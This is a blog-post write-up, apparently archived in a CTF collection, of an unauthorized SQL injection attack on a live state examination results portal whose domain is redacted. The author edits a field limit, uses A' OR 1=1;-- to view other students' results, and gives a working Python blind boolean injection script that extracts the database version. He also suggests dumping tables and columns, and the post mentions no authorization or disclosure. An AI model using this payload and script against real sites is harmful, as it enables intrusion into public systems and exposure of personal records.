# :game_die: How I hacked a State Results NIC portal with a simple SQL injection

> **Original Source:** [How I hacked a State Results NIC portal with a simple SQL injection](https://infosecwriteups.com/how-i-hacked-a-state-results-nic-portal-with-a-simple-sql-injection-e095725a091e)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# How I hacked a State Results NIC portal with a simple SQL injection


Hello and welcome to my new blog post! I am Adithya M S a Masters student, cyber and web security enthusiast focused on uncovering hidden endpoints, probing data breaches, and exploring attack vectors in web servers and clients. I study emerging threats and contribute to infosec — always learning, always breaking things!


Today, I shall share my findings on how I hacked a State Examination results NIC portal surprisingly simply through an SQL injection technique.


Please check out my other blog posts here : [https://medium.com/@rm224385](https://medium.com/@rm224385)

>

Disclaimer: The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Although all efforts have been made to hide the identity of the target, misuse of any such information is illegal and neither the author nor the publisher is responsible for any consequences due to misuse.


Let’s call the website redacted.nic.in (To prevent privacy and copyright issues). My brother gave a state entrance examination and I went to this portal to check his results when they arrived on 24th May. The page to check results looks like this.


*SCET results login page*


The URL of the results login page is [https://redacted.nic.in/slindfirst_25.asp](https://redacted.nic.in/slindfirst_25.asp)


At first I entered his application number and first four letters of his name in the respective fields and I was able to retreive his result.


After this, my hacker in me started thinking of an SQL injection plan. I just entered a “random” value of 123456789 in the application number field and A’ OR 1=1; — in the name field. There was a maxlength=4 restriction on thename field but I just inspected the element to change it. Then surprise,surprise I got to see somebody else’s result records.


*Inspecting the name field to change its maxlength from 4 to 90*


*SQL injection payload A’ OR 1=1; — in name field*


*Result after submitting above payload for SQL injection*


Now I tried the same think with A’ OR 1=2; —


I got the response


*Response for A’ OR 1=2; — SQL injection*


Yes!! Indeed the website uses user input directly in the SQL query to fetch the results.


## Get Adithya M S’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


We get a different response based on the truth value of the OR condition. Wow! This lends itself to a classic boolean based SQL injection.


```
import requests

# Microsoft SQL Server 2012 (SP2-GDR) (KB3194719) - 11.0.5388.0 (X64)
# Sep 23 2016 16:56:29
# A' OR SUBSTRING(CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), @@VERSION), 1), 3, 1) LIKE '4%';--

domain = "redacted.nic.in"
resource = "slrespage_2025.asp"
url = f"https://{domain}/{resource}"

def get_yn(query):
data = {'frm_tokens': '0.8958377', 'reg': '123456789', 'name': f"A' OR {query};--"}
res = requests.post(url, data=data)
content_length = int(res.headers['Content-Length'])
# print(content_length)
if content_length == 10796:
return True
elif content_length == 2511:
return False
else:
return Exception("Something is wrong with your exploit... Please change it")


# q = input("Enter your query: ")
# print(get_yn(q))

def get_ms_sql_version():
map = ["('8', '9', 'a', 'b', 'c', 'd', 'e', 'f')", "('4', '5', '6', '7', 'c', 'd', 'e', 'f')",
"('2', '6', 'a', 'e', '3', '7', 'b', 'f')", "('1', '3', '5', '7', '9', 'b', 'd', 'f')"]
count = 0
found_ver_str = ""
while get_yn(f"LENGTH(@@VERSION) > {count}"):
cval = 0
for i in range(2):
for h in range(4):
cval *= 2
cval += int(get_yn(f"SUBSTRING(CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), @@VERSION), 1), {3+2*count+i}, 1) IN {map[h]}"))
found_ver_str += chr(cval)
print("Ver found till now: ", found_ver_str)
count += 1
print("Hurray, we got it!!")
return found_ver_str

# print("Hurray, we got it!!")
get_ms_sql_version()
```


Let us put this vulnerability to action by retreiving the version of the SQL database system.


I guessed that it uses Microsoft SQL server as VERSION() function made the server hang possibly due to a server error.


Version string is represented as @@VERSION in Microsoft SQL Server.


Notice that the web form sends a POST request to /slrespage_2025.asp without input data as parameters by observing the action attribute of the form element of the page.


Therefore, our Python program also sends POST request to this endpoint to get the results as the response.


The above Python program runs a query to get the hex encoded string of @@VERSION and send four requests to check whether the character is in 4 different lists to get each bit of the binary encoding of the character and thus deduce one character with four requests.


Then we add this character to the found_ver_str variable and check whether @@VERSION has a higher length than the number of characters we found and run this process iteratively.


Let’s see this program in action


*Output of the Blind SQL injection exploit code*


Now after this, we can all understand that this could be used to get any string from the database, and possibly enumerate all values in a particular field too (If these YES or NO answers are used in a clever way). For example, one could enumerate all table names in the database and enumerate all column names in a particular table after which values of this column may well reveal sensitive information.


Please respond to to this blog if you would like another blog post on techniques for enumerating records with Blind SQL injection!!


What a boolean based SQL injection 💉, right ?


I hope you guys had a nice time reading about my practical experience with web bugs. I shall bring more such articles if you like this one.


Please do respond with your valuable feedback and give me some claps 👏 ifyou liked this one as these small gestures push me towards building bettercontent. Also follow me to get regular notifications of content published my me..


Happy hacking and see you all next time !!

---

*Originally published on [Medium](https://infosecwriteups.com/how-i-hacked-a-state-results-nic-portal-with-a-simple-sql-injection-e095725a091e). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
